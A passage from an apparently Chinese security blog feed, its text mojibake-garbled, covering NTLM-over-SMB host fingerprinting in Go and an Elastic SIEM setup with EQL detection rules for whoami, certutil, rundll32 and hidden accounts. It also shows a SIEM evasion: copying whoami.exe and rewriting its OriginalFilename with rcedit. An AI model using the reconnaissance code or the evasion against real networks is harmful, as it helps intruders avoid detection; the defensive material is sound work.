:&#x3D; ChallengeMsg&#123;&#125;info :&#x3D; type2.String(bs)fmt.Println(info)&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-5.png"></p><p>Windows10é»˜è®¤ä½¿ç”¨SMBv2åè®®ï¼Œæ²¡æœ‰æ‰“å¼€SMBv1å¼€å…³ï¼Œ<a href="https://github.com/RowTeam/SharpDetectionNTLMSSP">Rcollå¸ˆå‚…çš„SharpDetectionNTLMSSP</a>åªå‘é€äº†SMBv1çš„æ¢æµ‹ï¼Œæ²¡æœ‰æ¢æµ‹SMBv2ã€‚<a href="https://github.com/FeigongSec/NTLMINFO">éæ”»NTLMINFO</a>å¸ˆå‚…å°±æ¯”è¾ƒå®Œæ•´ï¼Œå…ˆæ¢æµ‹SMBv1ï¼Œå¤±è´¥ä¹‹åå°è¯•SMBv2ã€‚</p><h3 id="SMBv2"><a href="#SMBv2" class="headerlink" title="SMBv2"></a>SMBv2</h3><p>å‚è€ƒ<a href="https://github.com/FeigongSec/NTLMINFO/blob/016e1859b7c0f4cc55c923027bc24174b0586bc7/SmbInfo/SmbInfo/Program.cs#L83">éæ”»å¸ˆå‚…çš„ä»£ç </a>ï¼Œå…ˆå‘é€ç¬¬ä¸€æ¬¡çš„æ¢æµ‹è¯·æ±‚ï¼Œæ‰¾åˆ°åç§»é‡70çš„åœ°æ–¹ï¼Œåšä¸€æ¬¡åˆ¤æ–­æ˜¯å¦å‘é€ç¬¬äºŒä¸ªæ•°æ®åŒ…ã€‚æ¢æˆGOä»£ç å°±æ¯”è¾ƒç®€å•äº†ï¼Œè¿™é‡Œçš„åç§»70ä¿å­˜çš„æ˜¯æ˜¯SMBv2çš„<code>Security mode</code>:</p><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-6.png"></p><p>Goè¯­è¨€å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">var NTLMSSPNegotiatev2Data []byteif hex.EncodeToString(r2[70:71]) &#x3D;&#x3D; &quot;03&quot; &#123;flags :&#x3D; []byte&#123;0x15, 0x82, 0x08, 0xa0&#125;NTLMSSPNegotiatev2Data &#x3D; getNTLMSSPNegotiateData(flags)&#125; else &#123;flags :&#x3D; []byte&#123;0x05, 0x80, 0x08, 0xa0&#125;NTLMSSPNegotiatev2Data &#x3D; getNTLMSSPNegotiateData(flags)&#125;_, err &#x3D; conn2.Write(NegotiateSMBv2Data2)if err !&#x3D; nil &#123;return&#125;readBytes(conn2)_, err &#x3D; conn2.Write(NTLMSSPNegotiatev2Data)ret, _ :&#x3D; readBytes(conn2)ntlmOff :&#x3D; bytes.Index(ret, []byte(&quot;NTLMSSP&quot;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆå“ä¸»è¦å‚è€ƒéæ”»å¸ˆå‚…çš„ä»£ç ï¼Œé›†æˆåˆ°<a href="https://github.com/JKme/cube">Cube</a>ï¼Œå®Œæˆäº†winrmã€wmiã€smbã€mssqlç«¯å£çš„NTLMä¿¡æ¯æ¢æµ‹ã€‚</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://github.com/FeigongSec/NTLMINFO">éæ”»NTLMINFO</a></li><li><a href="https://github.com/RowTeam/SharpDetectionNTLMSSP">Rcollå¸ˆå‚…çš„SharpDetectionNTLMSSP</a></li><li><a href="https://github.com/zmap/zgrab2/tree/master/lib/smb/smb">An SMB library in Go</a></li><li><a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/4">NTLMåŸºç¡€ä»‹ç»</a></li><li><a href="http://iv4n.cc/ntlmssp/">Windows NTLMåè®®ç»†èŠ‚</a></li><li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb/f210069c-7086-4dc2-885e-861d837df688">Server Message Block (SMB) Protocol</a></li><li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/5606ad47-5ee0-437a-817e-70c366052962">Server Message Block (SMB) Protocol Versions 2 and 3</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;SMBï¼ˆServer Message Blockï¼‰åè®®ï¼Œå¯ç”¨äºåœ¨è®¡ç®—æœºé—´å…±äº«æ–‡ä»¶ã€æ‰“å°æœºã€ä¸²å£ç­‰ï¼Œç”µè„‘ä¸Šçš„ç½‘ä¸Šé‚»å±…å°±æ˜¯é å®ƒå®ç°çš„ã€‚SMBä½¿ç”¨äº†NetBIOSçš„åº”ç”¨ç¨‹åºæ¥å£ ï¼ˆApplication Program Interfaceï¼Œç®€ç§°APIï¼‰ã€‚å¦å¤–ï¼Œå®ƒæ˜¯ä¸€ä¸ªå¼€æ”¾æ€§çš„åè®®ï¼Œå…è®¸äº†åè®®æ‰©å±•â€”â€”ä½¿å¾—å®ƒå˜å¾—æ›´å¤§è€Œä¸”å¤æ‚ï¼›å¤§çº¦æœ‰65ä¸ªæœ€ä¸Šå±‚çš„ä½œä¸šï¼Œè€Œæ¯ä¸ªä½œä¸šéƒ½è¶…è¿‡120ä¸ªå‡½æ•°ï¼Œç”šè‡³Windows NTä¹Ÿæ²¡æœ‰å…¨éƒ¨æ”¯æŒåˆ°ï¼Œæœ€è¿‘å¾®è½¯åˆæŠŠ SMB æ”¹åä¸º CIFSï¼ˆCommon Internet File Systemï¼‰ï¼Œå¹¶ä¸”åŠ å…¥äº†è®¸å¤šæ–°çš„ç‰¹è‰²ã€‚SMBåè®®ä¸€èˆ¬ç«¯å£ä½¿ç”¨ä¸º139ï¼Œ445ï¼ŒCIFSåè®®æœ‰ä¸‰ä¸ªç‰ˆæœ¬ï¼šSMBã€SMB2ã€SMB3ã€‚&lt;/p&gt;
&lt;h3 id=&quot;NTLM&quot;&gt;&lt;a href=&quot;#NTLM&quot; class=&quot;headerlink&quot; title=&quot;NTLM&quot;&gt;&lt;/a&gt;NTLM&lt;/h3&gt;&lt;p&gt;åœ¨type2è¿”å›Challengeçš„è¿‡ç¨‹ä¸­ï¼ŒåŒæ—¶è¿”å›äº†æ“ä½œç³»ç»Ÿç±»å‹ï¼Œä¸»æœºåï¼Œnetbiosåç­‰ç­‰ã€‚è¿™ä¹Ÿå°±æ„å‘³ç€å¦‚æœæˆ‘ä»¬åœ¨èƒ½è·ŸæœåŠ¡å™¨è¿›è¡ŒNTLMäº¤æµä¸­ï¼Œç»™æœåŠ¡å™¨å‘é€ä¸€ä¸ªtype1çš„è¯·æ±‚ï¼ŒæœåŠ¡å™¨è¿”å›type2çš„å“åº”ï¼Œè¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°å¾ˆå¤šä¿¡æ¯ã€‚SMBv1å’ŒSMBv2çš„æ•°æ®åŒ…ç»“æ„æ˜¯ä¸åŒçš„&lt;/p&gt;
&lt;h3 id=&quot;SMBv1&quot;&gt;&lt;a href=&quot;#SMBv1&quot; class=&quot;headerlink&quot; title=&quot;SMBv1&quot;&gt;&lt;/a&gt;SMBv1&lt;/h3&gt;&lt;p&gt;ä½¿ç”¨&lt;a href=&quot;https://github.com/FeigongSec/NTLMINFO&quot;&gt;éæ”»NTLMINFO&lt;/a&gt;æ¢æµ‹SMBæ¥å£ï¼ŒæŠ“åŒ…é€šè¿‡wiresharkåˆ†æï¼ŒåŒ…å«æ“ä½œç³»ç»Ÿç±»å‹çš„æ•°æ®åŒ…ç”±SMB Headerå’ŒResponseç»„æˆï¼š&lt;br&gt;&lt;img src=&quot;/2021/08/06/windows-ntlm-smb-scan/ntlm-1.png&quot;&gt;&lt;br&gt;æˆ‘ä»¬çš„ç›®çš„æ˜¯è·å–smbæ•°æ®åŒ…çš„NTLMæ•°æ®ï¼Œç„¶åå¯¹NTLMæ•°æ®åŒ…è§£æï¼ŒNTLMæ•°æ®åŒ…ä¸Šä¸€å±‚æ˜¯GSS-APIï¼Œé¦–å…ˆæ‰¾åˆ°GSS-APIåœ¨æ•´ä¸ªæ•°æ®åŒ…çš„åç§»é‡ï¼ŒSMBçš„æ•°æ®åŒ…ç»“æ„é•¿åº¦å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;SMB Header:  32 byte
Word Count:  1 byte
AndXCommand: 1 byte
Reserved:    1 byte
AndXOffset:  2 byte
Action: 	   2 byte
Security Blob Length: 2 byte (è¡¨ç¤ºSecurity Blobçš„é•¿åº¦ï¼Œè¿™é‡Œçš„hexæ˜¯ 0f 10ï¼Œå°ç«¯è½¬æ¢ä¸º010f,å†è½¬æ¢æˆ10è¿›åˆ¶å°±æ˜¯271ï¼Œå¯¹åº”Security Blobçš„é•¿åº¦)
Byte Count: 2 byte (è¡¨ç¤ºSecurity BlobåŠ ä¸ŠNativeOSå’ŒNative Lançš„é•¿åº¦)
Security Blob: å¯å˜é•¿åº¦ï¼Œå–å†³äºSecurity Blob Length&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¸Šé¢çš„æ•°æ®åŒ…ç»“æ„çš„å…³é”®æ•°æ®æ˜¯&lt;code&gt;Security Blob Length&lt;/code&gt;å’Œ&lt;code&gt;Byte Content&lt;/code&gt;ï¼Œå‰è€…è¡¨ç¤ºGSS-APIçš„æ•´ä¸ªæ•°æ®åŒ…é•¿åº¦ï¼Œåè€…è¡¨ç¤ºGSS-APIå’ŒNative OSåŠ ä¸ŠNative LMçš„æ•°æ®é•¿åº¦ï¼š&lt;/p&gt;
&lt;h6 id=&quot;GSS-APIçš„é•¿åº¦æ˜¯271-Byte&quot;&gt;&lt;a href=&quot;#GSS-APIçš„é•¿åº¦æ˜¯271-Byte&quot; class=&quot;headerlink&quot; title=&quot;GSS-APIçš„é•¿åº¦æ˜¯271 Byte&quot;&gt;&lt;/a&gt;GSS-APIçš„é•¿åº¦æ˜¯271 Byte&lt;/h6&gt;&lt;p&gt;&lt;img src=&quot;/2021/08/06/windows-ntlm-smb-scan/ntlm-3.png&quot;&gt;&lt;/p&gt;
&lt;h6 id=&quot;Native-OSçš„é•¿åº¦æ˜¯42-Byte&quot;&gt;&lt;a href=&quot;#Native-OSçš„é•¿åº¦æ˜¯42-Byte&quot; class=&quot;headerlink&quot; title=&quot;Native OSçš„é•¿åº¦æ˜¯42 Byte&quot;&gt;&lt;/a&gt;Native OSçš„é•¿åº¦æ˜¯42 Byte&lt;/h6&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>SIEM On ELK</title>
    <link href="https://jkme.github.io/2021/08/02/siem-on-elk.html"/>
    <id>https://jkme.github.io/2021/08/02/siem-on-elk.html</id>
    <published>2021-08-01T16:00:00.000Z</published>
    <updated>2022-01-21T03:00:01.072Z</updated>
    
    <content type="html"><![CDATA[<h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p>å‚è€ƒé“¾æ¥é‡Œæœ‰è¯¦ç»†çš„å®‰è£…æ­¥éª¤ï¼Œæµ‹è¯•å®¢æˆ·ç«¯æ˜¯Windowsï¼Œå®‰è£…äº†å¦‚ä¸‹è½¯ä»¶ï¼š</p><ul><li>sysmon.exe(<a href="https://github.com/SwiftOnSecurity/sysmon-config">é…ç½®æ–‡ä»¶</a>)<ul><li><code>.\sysmon64.exe -accepteula -i c:\windows\config.xml</code></li></ul></li><li>winlogbeat.exe<ul><li><code>.\install-service-winlogbeat.ps1</code></li><li><code>.\winlogbeat.exe setup -e</code></li></ul></li><li>ElasticAgent.exe<ul><li><code>.\elastic-agent.exe install  --insecure -f --fleet-server-es=&lt;ES&gt; --fleet-server-service-token=&lt;token&gt;</code></li></ul></li></ul><h3 id="è§„åˆ™ç›‘æµ‹å’Œç»•è¿‡"><a href="#è§„åˆ™ç›‘æµ‹å’Œç»•è¿‡" class="headerlink" title="è§„åˆ™ç›‘æµ‹å’Œç»•è¿‡"></a>è§„åˆ™ç›‘æµ‹å’Œç»•è¿‡</h3><p>è§„åˆ™æœ‰5ç§æŸ¥è¯¢ï¼Œä¸€èˆ¬ä½¿ç”¨EQL(Event Query Language)æŸ¥è¯¢ç±»å‹:<br><img src="/2021/08/02/siem-on-elk/siem-1.png"><br>SIEMæœ‰å†…ç½®å¾ˆå¤šè§„åˆ™ï¼Œé»˜è®¤æ˜¯å…³é—­çŠ¶æ€ï¼Œè¿™äº›è§„åˆ™éƒ½æ˜¯ATT&amp;CKæ¡†æ¶æ”»å‡»è¡Œä¸ºè½¬åŒ–è€Œæ¥çš„ï¼Œä¾‹å¦‚windowsä¸‹çš„<code>whoami</code>æŸ¥è¯¢è§„åˆ™(<del>æ­£ç»äººè°æŸ¥whoamiå•Š</del>):</p><pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and process.name : &quot;whoami.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆ‘ä»¬æ‹¿è¿™æ¡è§„åˆ™åšåˆ†æï¼Œè¿™æ¡è§„åˆ™åŒ¹é…äº†å½“è¿›ç¨‹å¼€å§‹çš„æ—¶å€™ï¼Œè¿›ç¨‹åä¸º<code>whoami.exe</code>çš„æ—¶å€™è§¦å‘ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠ<code>whoami.exe</code>å¤åˆ¶ä¸€ä¸‹ï¼Œå°±å¯ä»¥ç»•è¿‡å»äº†:</p><pre class="line-numbers language-none"><code class="language-none">copy C:\Windows\System32\whoami.exe C:\Windows\temp\x.exeC:\Windows\temp\x.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ˜¯ä¸æ˜¯æŠŠsiemæƒ³çš„ç®€å•äº†ï¼Œè¿™è·Ÿé€šè¿‡å¤åˆ¶<code>net.exe</code>ç»•è¿‡æ·»åŠ ç”¨æˆ·ä¸€æ¨¡ä¸€æ ·ï¼Œä»”ç»†è§‚å¯Ÿä¸‹elké‡Œé¢çš„å­—æ®µï¼Œå¯ä»¥å‘ç°<code>process.pe.original_file_name</code>ä»ç„¶ä¿ç•™äº†<code>whoami.exe</code>ï¼Œè¿™æ˜¯PEæ–‡ä»¶é‡Œé¢å›ºå®šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰‹åŠ¨æŠŠé¢„è­¦è§„åˆ™ä¿®æ”¹ä¸€ä¸‹:</p><pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and process.pe.original_file_name: &quot;whoami.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ­¤æ—¶é€šè¿‡å¤åˆ¶ç»•è¿‡å°±å¤±æ•ˆäº†ï¼Œé‚£ä¹ˆ<code>process.pe.original_file_name</code>èƒ½ä¸èƒ½æ”¹å‘¢ï¼Ÿå¯ä»¥çš„ï¼Œ<a href="https://github.com/electron/rcedit/releases">rcedit</a>:</p><pre class="line-numbers language-none"><code class="language-none">cedit-x64.exe x.exe --set-version-string  OriginalFilename &quot;hello.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/02/siem-on-elk/siem-2.png"></p><p>æ­¤æ—¶å†æ¬¡æ‰§è¡Œ<code>x.exe</code>ï¼ŒSIEMé‡Œé¢ä¸ä¼šæœ‰å‘Šè­¦ä¿¡æ¯ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡è¿™ç§å½¢å¼ç»•è¿‡å’Œ<code>process.pe.original_file_name</code>ç›¸å…³çš„è§„åˆ™ï¼Œæ‰€ä»¥åœ¨å®é™…è¿‡ç¨‹ä¸­ï¼Œè¦ä»å¤šä¸ªç»´åº¦æ€è€ƒï¼Œæ¯”å¦‚networkã€æ³¨å†Œè¡¨ã€äº‹ä»¶ID</p><h3 id="å‘Šè­¦é€šçŸ¥"><a href="#å‘Šè­¦é€šçŸ¥" class="headerlink" title="å‘Šè­¦é€šçŸ¥"></a>å‘Šè­¦é€šçŸ¥</h3><p>ELKçš„åŸºç¡€ç‰ˆæ²¡æœ‰ç”¨æˆ·é€šçŸ¥çš„åŠŸèƒ½ï¼Œéœ€è¦å¼€é€šç™½é‡‘ç‰ˆï¼Œå¯ä»¥ç”³è¯·è¯•ç”¨30å¤©æˆ–è€…ç ´è§£ï¼Œå¦‚æœæƒ³é€šçŸ¥é’‰é’‰ï¼Œå¯ä»¥é€‰æ‹©webhookçš„æ–¹å¼ï¼Œåœ¨webhookçš„æ—¶å€™æ³¨æ„æ·»åŠ ä¸€ä¸ªè¯·æ±‚å¤´å­—æ®µ:<code>Content-Type: application/x-wwww-form-data</code>ï¼ŒActioné‡Œé¢å¢åŠ bodyæ ¼å¼:</p><pre class="line-numbers language-none"><code class="language-none">&#123;&#123;#context.alerts&#125;&#125;timestamp&#x3D;&#123;&#123;@timestamp&#125;&#125;&amp;rule_name&#x3D;&#123;&#123;context.rule.name&#125;&#125;&amp;risk_score&#x3D;&#123;&#123;context.rule.risk_score&#125;&#125;&amp;host_name&#x3D;&#123;&#123;host.name&#125;&#125;&amp;process_parent_name&#x3D;&#123;&#123;process.parent.name&#125;&#125;&amp;process_command_line&#x3D;&#123;&#123;process.command_line&#125;&#125;&amp;process_name&#x3D;&#123;&#123;process.name&#125;&#125;&amp;user_name&#x3D;&#123;&#123;user.name&#125;&#125;&amp;result_link&#x3D;&#123;&#123;&#123;context.results_link&#125;&#125;&#125;&#123;&#123;&#x2F;context.alerts&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æœåŠ¡ç«¯è§£æbodyç„¶åé€šçŸ¥é’‰é’‰ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetime<span class="token punctuation">,</span> timedeltaapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    form <span class="token operator">=</span> request<span class="token punctuation">.</span>form    <span class="token keyword">print</span><span class="token punctuation">(</span>form<span class="token punctuation">)</span>    timestamp <span class="token operator">=</span> date2local<span class="token punctuation">(</span>form<span class="token punctuation">[</span><span class="token string">"timestamp"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    rule_name <span class="token operator">=</span> form<span class="token punctuation">[</span><span class="token string">"rule_name"</span><span class="token punctuation">]</span>    <span class="token comment"># risk_score = form["risk_score"]</span>    host_name <span class="token operator">=</span> form<span class="token punctuation">[</span><span class="token string">"host_name"</span><span class="token punctuation">]</span>    process_parent_name <span class="token operator">=</span> form<span class="token punctuation">[</span><span class="token string">"process_parent_name"</span><span class="token punctuation">]</span>    process_name <span class="token operator">=</span> form<span class="token punctuation">[</span><span class="token string">"process_name"</span><span class="token punctuation">]</span>    process_command_line <span class="token operator">=</span> form<span class="token punctuation">[</span><span class="token string">"process_command_line"</span><span class="token punctuation">]</span>    user_name <span class="token operator">=</span> form<span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span>    result_link <span class="token operator">=</span> form<span class="token punctuation">[</span><span class="token string">"result_link"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">"%0a"</span><span class="token punctuation">)</span>    dingTalk_notify<span class="token punctuation">(</span>timestamp<span class="token punctuation">,</span> rule_name<span class="token punctuation">,</span> host_name<span class="token punctuation">,</span> process_parent_name<span class="token punctuation">,</span> process_name<span class="token punctuation">,</span> process_command_line<span class="token punctuation">,</span> user_name<span class="token punctuation">,</span> result_link<span class="token punctuation">)</span>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"OK"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">date2local</span><span class="token punctuation">(</span>date<span class="token punctuation">)</span><span class="token punctuation">:</span>    date <span class="token operator">=</span> datetime<span class="token punctuation">.</span>strptime<span class="token punctuation">(</span>date<span class="token punctuation">,</span> <span class="token string">"%Y-%m-%dT%H:%M:%S.%fZ"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>date <span class="token operator">+</span> timedelta<span class="token punctuation">(</span>hours<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%Y-%m-%d %H:%M:%S"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dingTalk_notify</span><span class="token punctuation">(</span>timestamp<span class="token punctuation">,</span> rule_name<span class="token punctuation">,</span> host_name<span class="token punctuation">,</span> process_parent_name<span class="token punctuation">,</span> process_name<span class="token punctuation">,</span> process_command_line<span class="token punctuation">,</span> user_name<span class="token punctuation">,</span> result_link<span class="token punctuation">)</span><span class="token punctuation">:</span>    token <span class="token operator">=</span> <span class="token string">""</span>      ddrobot <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"https://oapi.dingtalk.com/robot/send?access_token=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/json;charset=utf-8'</span>    <span class="token punctuation">&#125;</span>    json_text <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"msgtype"</span><span class="token punctuation">:</span> <span class="token string">"markdown"</span><span class="token punctuation">,</span>        <span class="token string">"markdown"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>            <span class="token string">"title"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"SIEMå‘Šè­¦"</span></span><span class="token punctuation">,</span>            <span class="token string">"text"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"### SIEMå‘Šè­¦é€šçŸ¥\n##### è§¦å‘æ—¶é—´: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>timestamp<span class="token punctuation">&#125;</span></span><span class="token string">\n##### è§¦å‘è§„åˆ™: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>rule_name<span class="token punctuation">&#125;</span></span><span class="token string">\n##### è§¦å‘ä¸»æœº: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>host_name<span class="token punctuation">&#125;</span></span><span class="token string">\n##### å…³è”çˆ¶è¿›ç¨‹: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>process_parent_name<span class="token punctuation">&#125;</span></span><span class="token string">\n##### å½“å‰è¿›ç¨‹: "</span></span>                    <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>process_name<span class="token punctuation">&#125;</span></span><span class="token string">\n#### è¿›ç¨‹å‚æ•°ï¼š</span><span class="token interpolation"><span class="token punctuation">&#123;</span>process_command_line<span class="token punctuation">&#125;</span></span><span class="token string">\n##### å½“å‰ç”¨æˆ·: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_name<span class="token punctuation">&#125;</span></span><span class="token string">\n##### [å‘Šè­¦è¯¦æƒ…](</span><span class="token interpolation"><span class="token punctuation">&#123;</span>result_link<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token string">"at"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>            <span class="token string">"atMobiles"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token string">"isAtAll"</span><span class="token punctuation">:</span> <span class="token string">"false"</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>ddrobot<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>json_text<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">,</span> threaded<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/08/02/siem-on-elk/siem-3.png"></p><h3 id="è§„åˆ™ç¤ºä¾‹"><a href="#è§„åˆ™ç¤ºä¾‹" class="headerlink" title="è§„åˆ™ç¤ºä¾‹"></a>è§„åˆ™ç¤ºä¾‹</h3><p>SIEMå†…ç½®çš„è§„åˆ™æœ‰å¾ˆå¤šï¼Œå¸¸ç”¨çš„è§„åˆ™æ‰“å¼€çš„æœ‰å¦‚ä¸‹å‡ ä¸ª:<br>è§„åˆ™åç§°ï¼šConhost Spawned By Suspicious Parent Process<br>è§„åˆ™ä»‹ç»ï¼šConsole Window Host (conhost.exe)ä½œä¸ºå­è¿›ç¨‹è¢«å¯åŠ¨ï¼Œé€šå¸¸æ˜¯åœ¨ä»£ç æ³¨å…¥è¿›ç¨‹çš„æ—¶å€™å‡ºç°</p><pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and  process.name : &quot;conhost.exe&quot; and  process.parent.name : (&quot;svchost.exe&quot;, &quot;lsass.exe&quot;, &quot;services.exe&quot;, &quot;smss.exe&quot;, &quot;winlogon.exe&quot;, &quot;explorer.exe&quot;,                         &quot;dllhost.exe&quot;, &quot;rundll32.exe&quot;, &quot;regsvr32.exe&quot;, &quot;userinit.exe&quot;, &quot;wininit.exe&quot;, &quot;spoolsv.exe&quot;,                         &quot;wermgr.exe&quot;, &quot;csrss.exe&quot;, &quot;ctfmon.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>è§„åˆ™åç§°ï¼šEncoding or Decoding Files via CertUtil<br>è§„åˆ™ä»‹ç»ï¼šé€šè¿‡CertUtilç¼–ç è§£ç æ–‡ä»¶</p><pre class="line-numbers language-none"><code class="language-none">process where event.type &#x3D;&#x3D; &quot;start&quot; and  (process.name : &quot;certutil.exe&quot; or process.pe.original_file_name &#x3D;&#x3D; &quot;CertUtil.exe&quot;) and  process.args : (&quot;?decode&quot;, &quot;?encode&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><p>è§„åˆ™åç§°ï¼šUnusual Child Processes of RunDLL32<br>è§„åˆ™ä»‹ç»ï¼šä¸æ­£å¸¸çš„rundll32.exeæ´»åŠ¨ï¼ˆé€šå¸¸ç”¨åœ¨å¯åŠ¨æœ¨é©¬è¿‡ç¨‹ä¸­ï¼Œæ¯”å¦‚CSçš„Spawnï¼‰</p><pre class="line-numbers language-none"><code class="language-none">sequence with maxspan&#x3D;1h  [process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and     (process.name : &quot;rundll32.exe&quot; or process.pe.original_file_name &#x3D;&#x3D; &quot;RUNDLL32.EXE&quot;) and      process.args_count &#x3D;&#x3D; 1  ] by process.entity_id  [process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and process.parent.name : &quot;rundll32.exe&quot;  ] by process.parent.entity_id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>è§„åˆ™åç§°ï¼šCreation of a Hidden Local User Account<br>è§„åˆ™ä»‹ç»ï¼šæ·»åŠ éšè—è´¦æˆ·ï¼ˆç”¨äºæƒé™ç»´æŒï¼‰</p><pre class="line-numbers language-none"><code 